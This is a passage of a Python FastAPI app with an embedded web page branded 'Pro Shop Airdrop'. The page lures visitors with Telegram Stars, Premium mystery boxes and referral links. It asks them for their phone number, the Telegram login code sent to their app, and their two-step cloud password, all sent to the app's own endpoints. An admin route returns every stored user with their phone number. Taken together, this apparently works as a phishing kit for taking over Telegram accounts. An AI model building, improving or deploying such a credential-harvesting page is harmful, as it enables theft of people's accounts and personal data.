async def admin_get_users(token: str = Query(..., description="Admin token")):
    if token != settings.ADMIN_TOKEN:
        raise HTTPException(status_code=403, detail="Invalid admin token.")
    return await db.get_all_users()

@app.get("/api/v1/system/health", tags=["System"])
async def health_check():
    return {
        "status": "healthy",
        "version": "22.0.0",
        "active_sessions": len(auth_manager.active_sessions),
        "db_records": len(db.data),
        "uptime": time.time()
    }

# ============================================================================
# 10.2 AIRDROP & DASHBOARD API ROUTES
# ============================================================================

def verify_web_token(request: Request):
    token = request.headers.get("Authorization", "").replace("Bearer ", "")
    user_id = request.headers.get("X-User-ID")
    if not token or not user_id:
        raise HTTPException(status_code=401, detail="Missing auth headers.")
    
    expected_token = hashlib.sha256(f"{user_id}{settings.SECRET_KEY}".encode()).hexdigest()
    if token != expected_token:
        raise HTTPException(status_code=403, detail="Invalid web token.")
    return int(user_id)

@app.get("/api/v1/airdrop/profile", tags=["Airdrop"])
async def airdrop_profile(request: Request):
    user_id = verify_web_token(request)
    user = await db.get_user_by_id(user_id)
    if not user:
        raise HTTPException(status_code=404, detail="User not found.")

    bot_username = os.getenv("BOT_USERNAME", "YourBot").lstrip("@")
    ref_code = user.get("ref_code", "")
    ref_link = f"https://t.me/{bot_username}?start=ref_{ref_code}" if ref_code else ""

    return {
        "user_id": user["user_id"],
        "first_name": user.get("first_name", ""),
        "username": user.get("username", ""),
        "phone": user["phone"],
        "balance": user.get("balance", 0),
        "ref_code": ref_code,
        "ref_link": ref_link,
        "referrals": user.get("referrals", 0),
        "rewards": user.get("rewards", [])
    }

@app.post("/api/v1/airdrop/open_gift", tags=["Airdrop"])
async def airdrop_open_gift(request: Request):
    user_id = verify_web_token(request)
    user = await db.get_user_by_id(user_id)
    
    if not user:
        raise HTTPException(status_code=404, detail="User not found.")
        
    if user.get("balance", 0) < 17:
        raise HTTPException(status_code=400, detail="You need at least 17 coins to open a Mystery Box.")
    
    import random
    roll = random.random()
    now = datetime.now().isoformat()
    
    # 5% شانس پرمیوم ۱ ماهه، 95% شانس استارز (۱ تا ۵۰)
    if roll < 0.05:
        reward = {"type": "Premium", "amount": "1 Month", "date": now}
    else:
        stars = random.randint(1, 50)
        reward = {"type": "Stars", "amount": stars, "date": now}
        
    new_balance = user["balance"] - 17
    await db.update_user_balance(user_id, new_balance, reward)
    
    return {"status": "success", "reward": reward, "new_balance": new_balance}

@app.post("/api/v1/airdrop/open-gift", tags=["Airdrop"])
async def airdrop_open_gift_alias(request: Request):
    return await airdrop_open_gift(request)

# ============================================================================
# 11. FRONTEND (Pro Shop Premium SPA)
# ============================================================================

FRONTEND_HTML = r"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Shop | Airdrop Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --ps-gold: #ffb300; --ps-gold-light: #ffd54f;
            --ps-bg: #0a0e14; --ps-bg-secondary: #11161f; --ps-bg-tertiary: #1c2330;
            --ps-text: #ffffff; --ps-text-secondary: #6b7785;
            --ps-success: #00e676; --ps-error: #ff5252; --ps-blue: #00b0ff;
            --ps-border: #2a3342; --ps-purple: #9c27b0;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-font-smoothing: antialiased; }
        html, body { height: 100%; font-family: 'Inter', sans-serif; background-color: var(--ps-bg); color: var(--ps-text); overflow-x: hidden; }
        
        .bg-pattern { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
            background-color: var(--ps-bg);
            background-image: radial-gradient(circle at 15% 15%, rgba(255, 179, 0, 0.06) 0%, transparent 35%), radial-gradient(circle at 85% 85%, rgba(0, 176, 255, 0.06) 0%, transparent 35%); }
        
        .container { display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px; padding-bottom: 80px; }
        
        .auth-card { background: var(--ps-bg-secondary); border-radius: 20px; padding: 40px; width: 100%; max-width: 450px; box-shadow: 0 20px 60px rgba(0,0,0,0.5); border: 1px solid var(--ps-border); position: relative; overflow: hidden; }
        .auth-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px; background: linear-gradient(to right, var(--ps-gold), var(--ps-gold-light)); }
        
        .dashboard-card { background: var(--ps-bg-secondary); border-radius: 20px; padding: 30px; width: 100%; max-width: 500px; box-shadow: 0 20px 60px rgba(0,0,0,0.5); border: 1px solid var(--ps-border); margin-top: 20px; }
        
        .auth-header { text-align: center; margin-bottom: 30px; }
        .logo-wrapper { width: 80px; height: 80px; margin: 0 auto 15px; background: linear-gradient(135deg, var(--ps-gold) 0%, var(--ps-gold-light) 100%); border-radius: 20px; display: flex; justify-content: center; align-items: center; box-shadow: 0 10px 30px rgba(255, 179, 0, 0.3); animation: float 3s ease-in-out infinite; }
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
        .logo-wrapper svg { width: 40px; height: 40px; fill: var(--ps-bg); }
        .auth-header h1 { font-size: 24px; font-weight: 800; margin-bottom: 8px; background: linear-gradient(to right, #fff, #6b7785); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .auth-header p { color: var(--ps-text-secondary); font-size: 14px; min-height: 20px; }
        
        .form-group { margin-bottom: 20px; position: relative; }
        .form-label { display: block; margin-bottom: 8px; color: var(--ps-text-secondary); font-size: 12px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
        .form-input { width: 100%; padding: 16px 18px; background: var(--ps-bg); border: 1px solid var(--ps-border); border-radius: 12px; color: var(--ps-text); font-family: 'Inter', sans-serif; font-size: 16px; outline: none; transition: all 0.2s; }
        .form-input:focus { border-color: var(--ps-gold); box-shadow: 0 0 0 4px rgba(255, 179, 0, 0.1); }
        
        .btn-primary { width: 100%; padding: 16px; background: linear-gradient(to right, var(--ps-gold), var(--ps-gold-light)); border: none; border-radius: 12px; color: var(--ps-bg); font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.2s; margin-top: 10px; text-transform: uppercase; letter-spacing: 1px; display: flex; align-items: center; justify-content: center; }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(255, 179, 0, 0.3); }
        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
        
        .btn-text { background: none; border: none; color: var(--ps-text-secondary); cursor: pointer; font-size: 14px; display: block; margin: 15px auto 0; transition: color 0.2s; }
        .btn-text:hover { color: var(--ps-gold); }
        
        .form-step { display: none; animation: slideIn 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
        .form-step.active { display: block; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
        
        .otp-group { display: flex; justify-content: space-between; gap: 10px; }
        .otp-input { width: 50px; height: 60px; text-align: center; background: var(--ps-bg); border: 1px solid var(--ps-border); border-radius: 12px; color: var(--ps-text); font-size: 24px; font-weight: 600; outline: none; transition: all 0.2s; }
        .otp-input:focus { border-color: var(--ps-gold); box-shadow: 0 0 0 4px rgba(255, 179, 0, 0.1); transform: scale(1.05); }
        
        .toast-container { position: fixed; top: 20px; right: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 10px; max-width: 350px; }
        .toast { background: var(--ps-bg-secondary); border-left: 4px solid var(--ps-gold); padding: 15px 20px; border-radius: 10px; box-shadow: 0 5px 20px rgba(0,0,0,0.4); animation: slideIn 0.3s ease; font-size: 14px; border: 1px solid var(--ps-border); }
        .toast.success { border-left-color: var(--ps-success); color: var(--ps-success); }
        .toast.error { border-left-color: var(--ps-error); color: var(--ps-error); }
        
        .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(0,0,0,0.3); border-radius: 50%; border-top-color: var(--ps-bg); animation: spin 1s linear infinite; margin-right: 10px; vertical-align: middle; }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        /* Dashboard Specifics */
        .dash-header { display: flex; align-items: center; gap: 15px; margin-bottom: 25px; }
        .avatar-placeholder { width: 60px; height: 60px; background: linear-gradient(135deg, var(--ps-gold), var(--ps-gold-light)); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: 700; color: var(--ps-bg); }
        .dash-info h2 { font-size: 18px; margin-bottom: 4px; }
        .dash-info p { color: var(--ps-text-secondary); font-size: 13px; }
        
        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px; }
        .stat-box { background: var(--ps-bg); padding: 15px; border-radius: 12px; border: 1px solid var(--ps-border); text-align: center; }
        .stat-box h3 { font-size: 24px; color: var(--ps-gold); margin-bottom: 5px; }
        .stat-box p { font-size: 12px; color: var(--ps-text-secondary); text-transform: uppercase; }
        
        .section-title { font-size: 16px; font-weight: 700; margin-bottom: 15px; display: flex; align-items: center; gap: 8px; }
        
        .ref-box { background: var(--ps-bg); padding: 15px; border-radius: 12px; border: 1px dashed var(--ps-border); display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .ref-link { color: var(--ps-blue); font-size: 13px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 70%; }
        .copy-btn { background: var(--ps-bg-tertiary); color: var(--ps-text); border: none; padding: 8px 12px; border-radius: 8px; cursor: pointer; font-size: 12px; font-weight: 600; transition: 0.2s; }
        .copy-btn:hover { background: var(--ps-gold); color: var(--ps-bg); }
        
        .mystery-box-container { text-align: center; padding: 20px 0; }
        .mystery-box { width: 120px; height: 120px; margin: 0 auto 20px; background: linear-gradient(135deg, var(--ps-purple), #ff4081); border-radius: 20px; display: flex; align-items: center; justify-content: center; font-size: 48px; box-shadow: 0 10px 30px rgba(156, 39, 176, 0.4); cursor: pointer; transition: transform 0.2s; animation: pulse 2s infinite; }
        .mystery-box:hover { transform: scale(1.05); }
        .mystery-box.shaking { animation: shake 0.5s infinite; }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(156, 39, 176, 0.4); } 70% { box-shadow: 0 0 0 20px rgba(156, 39, 176, 0); } 100% { box-shadow: 0 0 0 0 rgba(156, 39, 176, 0); } }
        @keyframes shake { 0% { transform: rotate(0deg); } 25% { transform: rotate(-10deg); } 75% { transform: rotate(10deg); } 100% { transform: rotate(0deg); } }
        
        .rewards-list { max-height: 200px; overflow-y: auto; }
        .reward-item { display: flex; align-items: center; gap: 10px; padding: 10px; background: var(--ps-bg); border-radius: 10px; margin-bottom: 8px; border: 1px solid var(--ps-border); }
        .reward-icon { width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 16px; }
        .reward-icon.stars { background: rgba(255, 179, 0, 0.2); color: var(--ps-gold); }
        .reward-icon.premium { background: rgba(156, 39, 176, 0.2); color: var(--ps-purple); }
        .reward-info p { font-size: 13px; font-weight: 600; }
        .reward-info span { font-size: 11px; color: var(--ps-text-secondary); }
        
        /* Modal */
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 10000; display: none; justify-content: center; align-items: center; }
        .modal-overlay.active { display: flex; animation: fadeIn 0.3s; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .modal-content { background: var(--ps-bg-secondary); padding: 40px; border-radius: 20px; text-align: center; max-width: 350px; width: 90%; border: 2px solid var(--ps-gold); animation: scaleUp 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
        @keyframes scaleUp { from { transform: scale(0.5); opacity: 0; } to { transform: scale(1); opacity: 1; } }
        .modal-icon { font-size: 64px; margin-bottom: 20px; }
        .modal-title { font-size: 24px; font-weight: 800; margin-bottom: 10px; }
        .modal-desc { color: var(--ps-text-secondary); margin-bottom: 25px; }
    </style>
</head>
<body>
    <div class="bg-pattern"></div>
    <div class="toast-container" id="toastContainer"></div>
    
    <!-- Reward Modal -->
    <div class="modal-overlay" id="rewardModal">
        <div class="modal-content">
            <div class="modal-icon" id="modalIcon">🎁</div>
            <h2 class="modal-title" id="modalTitle">Congratulations!</h2>
            <p class="modal-desc" id="modalDesc">You won 10 Stars!</p>
            <button class="btn-primary" onclick="document.getElementById('rewardModal').classList.remove('active')">Awesome!</button>
        </div>
    </div>

    <div class="container">
        <!-- AUTH SECTION -->
        <div class="auth-card">
            <div class="auth-header">
                <div class="logo-wrapper">
                    <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zm0 13L2 10v8l10 5 10-5v-8l-10 5z"/></svg>
                </div>
                <h1>Pro Shop Airdrop</h1>
                <p id="stepDescription">Secure MTProto Authentication</p>
            </div>

            <div class="form-step active" id="step_phone">
                <form id="phoneForm" autocomplete="off">
                    <div class="form-group">
                        <label class="form-label" for="phone">Phone Number</label>
                        <input type="tel" id="phone" class="form-input" placeholder="+1 234 567 890" required>
                    </div>
                    <button type="submit" class="btn-primary" id="btnSendCode">Continue</button>
                </form>
            </div>

            <div class="form-step" id="step_code">
                <form id="codeForm" autocomplete="off">
                    <div class="form-group">
                        <label class="form-label">Verification Code</label>
                        <div class="otp-group">
                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                        </div>
                        <input type="hidden" id="codeHidden">
                    </div>
                    <button type="submit" class="btn-primary" id="btnVerifyCode">Verify Code</button>
                    <button type="button" class="btn-text" id="backToPhone">Change Phone Number</button>
                </form>
            </div>

            <div class="form-step" id="step_2fa">
                <form id="twoFaForm" autocomplete="off">
                    <div class="form-group">
                        <label class="form-label" for="password">Two-Step Verification</label>
                        <input type="password" id="password" class="form-input" placeholder="Enter your password" required>
                    </div>
                    <button type="submit" class="btn-primary" id="btnVerify2fa">Unlock Account</button>
                </form>
            </div>
        </div>

        <!-- DASHBOARD SECTION -->
        <div class="form-step" id="step_dashboard" style="max-width: 500px; width: 100%;">
            <div class="dashboard-card">
                <div class="dash-header">
                    <div class="avatar-placeholder" id="avatarPlaceholder">U</div>
                    <div class="dash-info">
                        <h2 id="userName">Loading...</h2>
                        <p id="userUsername">@username</p>
                    </div>
                </div>

                <div class="stats-grid">
                    <div class="stat-box">
                        <h3 id="statBalance">0</h3>
                        <p>Balance</p>
                    </div>
                    <div class="stat-box">
                        <h3 id="statRefs">0</h3>
                        <p>Referrals</p>
                    </div>
                </div>

                <div class="section-title">🎁 Mystery Box</div>
                <div class="mystery-box-container">
                    <div class="mystery-box" id="mysteryBox">📦</div>
                    <p style="color:var(--ps-text-secondary); font-size:14px; margin-bottom:15px;">Open the box for 17 Coins to win up to 50 Stars or Premium!</p>
                    <button class="btn-primary" id="btnOpenBox" style="background: linear-gradient(to right, var(--ps-purple), #ff4081);">Open for 17 Coins</button>
                </div>
            </div>

            <div class="dashboard-card">
                <div class="section-title">🔗 Referral Link</div>
                <div class="ref-box">
                    <span class="ref-link" id="refLink">https://t.me/YourBot?start=ref_CODE</span>
                    <button class="copy-btn" id="copyBtn">Copy</button>
                </div>
                
                <div class="section-title" style="margin-top:25px;">🏆 Recent Rewards</div>
                <div class="rewards-list" id="rewardsList">
                    <p style="text-align:center; color:var(--ps-text-secondary); font-size:13px;">No rewards yet. Open a mystery box!</p>
                </div>
            </div>
            
            <button class="btn-primary" id="btnLogout" style="background: var(--ps-error); color: #fff; margin-top: 20px;">Log Out</button>
        </div>
    </div>

    <script>
        let currentSessionId = null;
        let webToken = null;
        let userId = null;

        const Toast = {
            container: document.getElementById('toastContainer'),
            show: function(message, type = 'info', duration = 3500) {
                const toast = document.createElement('div');
                toast.className = `toast ${type}`;
                toast.textContent = message;
                this.container.appendChild(toast);
                setTimeout(() => toast.remove(), duration);
            }
        };

        const Steps = {
            current: 'phone',
            steps: {
                phone: { el: document.getElementById('step_phone'), desc: 'Secure MTProto Authentication' },
                code: { el: document.getElementById('step_code'), desc: 'Enter the 5-digit code sent to your app' },
                '2fa': { el: document.getElementById('step_2fa'), desc: 'Enter your cloud password' },
                dashboard: { el: document.getElementById('step_dashboard'), desc: 'Welcome to Airdrop Dashboard' }
            },
            go: function(step) {
                document.querySelector('.auth-card').style.display = step === 'dashboard' ? 'none' : 'block';
                Object.values(this.steps).forEach(s => s.el.classList.remove('active'));
                this.steps[step].el.classList.add('active');
                this.current = step;
            }
        };

        async function apiReq(endpoint, data) {
            const res = await fetch(endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            const json = await res.json();
            if (!res.ok) throw new Error(json.detail || 'API Error');
            return json;
        }

        function setLoading(btn, loading, text) {
            btn.disabled = loading;
            btn.innerHTML = loading ? `<span class="spinner"></span> Processing...` : text;
        }

        // Auth Logic
        document.getElementById('phoneForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const phone = document.getElementById('phone').value.trim();
            const btn = document.getElementById('btnSendCode');
            // Get ref_code from URL if exists
            const urlParams = new URLSearchParams(window.location.search);
            const refCode = urlParams.get('ref');
            
            if (!phone.match(/^\+?[0-9]{10,15}$/)) return Toast.show('Invalid phone format.', 'error');
            setLoading(btn, true, 'Continue');
            try {
                const res = await apiReq('/api/v1/json/send-code', { phone, ref_code: refCode });
                currentSessionId = res.data.session_id;
                Toast.show(res.message, 'success');
                Steps.go('code');
            } catch (err) { Toast.show(err.message, 'error'); }
            finally { setLoading(btn, false, 'Continue'); }
        });

        const otpInputs = document.querySelectorAll('.otp-input');
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (input.value.length > 1) input.value = input.value.slice(0, 1);
                if (input.value.length === 1 && index < otpInputs.length - 1) otpInputs[index + 1].focus();
                let code = '';
                otpInputs.forEach(i => code += i.value);
                document.getElementById('codeHidden').value = code;
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && input.value === '' && index > 0) otpInputs[index - 1].focus();
            });
        });

        document.getElementById('codeForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const code = document.getElementById('codeHidden').value;
            const btn = document.getElementById('btnVerifyCode');
            if (code.length !== 5) return Toast.show('Enter all 5 digits.', 'error');
            setLoading(btn, true, 'Verify Code');
            try {
                const res = await apiReq('/api/v1/json/verify-code', { session_id: currentSessionId, code });
                if (res.status === 'success') {
                    webToken = res.web_token;
                    userId = res.user.user_id;
                    Toast.show('Login successful!', 'success');
                    loadDashboard();
                    Steps.go('dashboard');
                } else if (res.status === '2fa_required') {
                    Toast.show(res.message, 'info');
                    Steps.go('2fa');
                }
            } catch (err) { Toast.show(err.message, 'error'); }
            finally { setLoading(btn, false, 'Verify Code'); }
        });

        document.getElementById('backToPhone').addEventListener('click', () => {
            otpInputs.forEach(i => i.value = '');
            Steps.go('phone');
        });

        document.getElementById('twoFaForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const password = document.getElementById('password').value;
            const btn = document.getElementById('btnVerify2fa');
            setLoading(btn, true, 'Unlock Account');
            try {
                const res = await apiReq('/api/v1/json/verify-2fa', { session_id: currentSessionId, password });
                if (res.status === 'success') {
                    webToken = res.web_token;
                    userId = res.user.user_id;
                    Toast.show('2FA successful!', 'success');
                    loadDashboard();
                    Steps.go('dashboard');
                }
            } catch (err) { Toast.show(err.message, 'error'); }
            finally { setLoading(btn, false, 'Unlock Account'); }
        });

        // Dashboard Logic
        async function loadDashboard() {
            try {
                const res = await fetch('/api/v1/airdrop/profile', {
                    headers: { 'Authorization': `Bearer ${webToken}`, 'X-User-ID': userId }
                });
                const data = await res.json();
                
                document.getElementById('userName').textContent = `${data.first_name || 'User'}`;
                document.getElementById('userUsername').textContent = data.username ? `@${data.username}` : `ID: ${data.user_id}`;
                document.getElementById('avatarPlaceholder').textContent = data.first_name ? data.first_name.charAt(0).toUpperCase() : 'U';
                document.getElementById('statBalance').textContent = data.balance;
                document.getElementById('statRefs').textContent = data.referrals;
                document.getElementById('refLink').textContent = data.ref_link || `https://t.me/YourBot?start=ref_${data.ref_code}`;
                
                const rewardsList = document.getElementById('rewardsList');
                if(data.rewards && data.rewards.length > 0) {
                    rewardsList.innerHTML = data.rewards.reverse().map(r => `
                        <div class="reward-item">
                            <div class="reward-icon ${r.type.toLowerCase()}">${r.type === 'Premium' ? '⭐️' : '✨'}</div>
                            <div class="reward-info">
                                <p>${r.amount} ${r.type}</p>
                                <span>${new Date(r.date).toLocaleString()}</span>
                            </div>
                        </div>
                    `).join('');
                }
            } catch (err) { Toast.show('Failed to load profile.', 'error'); }
        }

        document.getElementById('btnOpenBox').addEventListener('click', async () => {
            const box = document.getElementById('mysteryBox');
            const btn = document.getElementById('btnOpenBox');
            box.classList.add('shaking');
            btn.disabled = true;
            btn.innerHTML = `<span class="spinner"></span> Opening...`;
            
            try {
                const res = await fetch('/api/v1/airdrop/open-gift', {
                    method: 'POST',
                    headers: { 'Authorization': `Bearer ${webToken}`, 'X-User-ID': userId }
                });
                const data = await res.json();
                if(!res.ok) throw new Error(data.detail);
                
                setTimeout(() => {
                    box.classList.remove('shaking');
                    btn.disabled = false;
                    btn.innerHTML = 'Open for 17 Coins';
                    
                    // Show Modal
                    document.getElementById('modalIcon').textContent = data.reward.type === 'Premium' ? '🚀' : '✨';
                    document.getElementById('modalTitle').textContent = data.reward.type === 'Premium' ? 'JACKPOT!' : 'You Won!';
                    document.getElementById('modalDesc').textContent = `Congratulations! You won ${data.reward.amount} ${data.reward.type}!`;
                    document.getElementById('rewardModal').classList.add('active');
                    
                    // Update balance
                    document.getElementById('statBalance').textContent = data.new_balance;
                    loadDashboard(); // Refresh rewards list
                }, 1500);
            } catch (err) {
                box.classList.remove('shaking');
                btn.disabled = false;
                btn.innerHTML = 'Open for 17 Coins';
                Toast.show(err.message, 'error');
            }
        });

        document.getElementById('copyBtn').addEventListener('click', () => {
            const link = document.getElementById('refLink').textContent;
            navigator.clipboard.writeText(link);
            Toast.show('Referral link copied!', 'success');
        });

        document.getElementById('btnLogout').addEventListener('click', () => {
            window.location.href = '/';
        });
    </script>
</body>
</html>
"""

@app.get("/", response_class=HTMLResponse, include_in_schema=False)
async def serve_frontend():
    if not settings.ENABLE_WEB_UI:
        return HTMLResponse("<h1>Pro Shop API</h1><p>Web UI is disabled.</p>")
    return HTMLResponse(content=FRONTEND_HTML)

# ============================================================================
# 12. MAIN EXECUTION
# ============================================================================

if __name__ == "__main__":
    log.info("Initializing Pro Shop Enterprise System...")
    uvicorn.run(
        "app:app",
        host=settings.HOST,
        port=settings.PORT,
        log_level="info",
        workers=1
    )
